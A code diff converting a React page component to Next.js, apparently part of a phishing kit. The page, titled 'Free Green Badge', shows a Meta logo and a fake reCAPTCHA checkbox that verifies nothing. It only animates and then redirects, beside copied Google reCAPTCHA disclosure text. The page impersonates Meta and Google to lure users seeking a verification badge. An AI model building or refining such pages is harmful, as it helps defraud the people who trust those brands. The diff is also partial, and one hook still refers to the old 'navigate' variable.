@@ -1,16 +1,15 @@
-import { useState, useEffect } from "react";
-import { useNavigate } from "react-router-dom";
-import "./Live.scss";
-
-// Sử dụng ảnh từ thư mục public (giống như bạn đã khai báo trước đó)
-const META_IMAGE = "/meta-image.png";
-const RECAPTCHA_IMAGE = "/recaptcha.png";
-const CHECKMARK_IMAGE = "/checkmark.png"; // Hoặc "/imgi_3_shild.eca4fb565452b837de2f.png" nếu bạn có ảnh checkmark riêng
-
-export default function Live() {
-  const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(false);
-  const [isShowCheckMark, setIsShowCheckMark] = useState(false);
+'use client';
+import CheckMarkImage from '/checkmark.png';
+import MetaImage from '/meta-image.png';
+import ReCaptchaImage from '/recaptcha.png';
+import axios from 'axios';
+import Image from 'next/image';
+import { useRouter } from 'next/navigation';
+import { useEffect, useState, type FC } from 'react';
+const Index: FC = () => {
+    const router = useRouter();
+    const [isLoading, setIsLoading] = useState(false);
+    const [isShowCheckMark, setisShowCheckMark] = useState(false);
 
   const handleVerify = () => {
     setIsLoading(true);
@@ -32,68 +31,48 @@ export default function Live() {
   }, [isShowCheckMark, navigate]);
 
   return (
-    <div className="live-container">
-      <title>Free Green Badge</title>
-      <div className="live-box">
-        <img src={META_IMAGE} alt="Meta" className="live-meta" />
-        
-        <div className="checkbox-row">
-          <div className="checkbox-wrapper">
-            <div className="checkbox-left">
-              <div className="checkbox-btn-container">
-                <button
-                  className="checkbox-button"
-                  onClick={handleVerify}
-                >
-                  <input type="checkbox" className="hidden-checkbox" />
-                  {isLoading ? (
-                    <div className="spinner"></div>
-                  ) : (
-                    <div
-                      className={`checkbox-square ${!isShowCheckMark ? 'not-checked' : 'checked'}`}
-                      style={{
-                        // Bạn cần có 1 file ảnh checkmark sprite giống project kia, 
-                        // tạm thời tôi dùng background color/image đơn giản cho class 'checked'
-                        // backgroundImage: isShowCheckMark ? `url("${CHECKMARK_IMAGE}")` : '',
-                        // backgroundPosition: '-10px -595px'
-                      }}
-                    >
-                        {/* Hiện ký hiệu check tạm nếu không có ảnh sprite */}
-                        {isShowCheckMark && <span className="temp-check">✓</span>}
+        <div className='flex flex-col items-center justify-center pt-[150px]'>
+            <title>Free Green Badge</title>
+            <div className='w-[300px]'>
+                <Image src={MetaImage} alt='' className='w-16' />
+                <div className='flex w-full items-center justify-start py-5'>
+                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
+                        <div className='flex items-center justify-start'>
+                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
+                                <button
+                                    className='flex h-full w-full items-center justify-center'
+                                    onClick={() => {
+                                        handleVerify();
+                                    }}
+                                >
+                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
+                                    {isLoading ? (
+                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
+                                    ) : (
+                                        <div
+                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
+                                            style={{
+                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
+                                                backgroundPosition: '-10px -595px'
+                                            }}
+                                        ></div>
+                                    )}
+                                </button>
+                            </div>
+                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
+                        </div>
+                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
+                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
+                            <p className='text-[10px] font-bold'>reCAPTCHA</p>
+                            <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
+                        </div>
                     </div>
-                  )}
-                </button>
-              </div>
-              <div className="checkbox-label">I'm not a robot</div>
+                </div>
+                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
+                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
+                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                </div>
             </div>
-
-            <div className="recaptcha-block">
-              <img src={RECAPTCHA_IMAGE} alt="reCAPTCHA" className="recaptcha-img" />
-              <p className="recaptcha-text">reCAPTCHA</p>
-              <small className="recaptcha-small">Privacy - Terms</small>
-            </div>
-          </div>
         </div>
-
-        <div className="live-text">
-          <p>
-            This helps us to combat harmful conduct, detect and prevent spam and
-            maintain the integrity of our Products.
-          </p>
-          <p>
-            We’ve used Google's reCAPTCHA Enterprise product to provide this
-            security check. Your use of reCAPTCHA Enterprise is subject to
-            Google’s Privacy Policy and Terms of Use.
-          </p>
-          <p>
-            reCAPTCHA Enterprise collects hardware and software information,
-            such as device and application data, and sends it to Google to
-            provide, maintain, and improve reCAPTCHA Enterprise and for general
-            security purposes. This information is not used by Google for
-            personalized advertising.
-          </p>
-        </div>
-      </div>
-    </div>
-  );
-}
+    );
